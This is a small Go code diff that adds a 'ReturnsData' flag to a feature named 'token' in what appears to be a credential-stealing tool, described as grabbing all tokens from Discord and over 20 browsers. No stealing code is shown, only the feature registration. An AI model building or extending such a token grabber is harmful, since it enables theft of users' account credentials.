@@ -9,6 +9,7 @@ func init() {
 	FeatureList = append(FeatureList, Feature{
 		Name:        "token",
 		Description: "Attempt to grab all tokens from Discord and 20+ browsers",
+		ReturnsData: true,
 		Args:        []Arg{},
 		Dependencies: []string{
 			"system.lib.go",
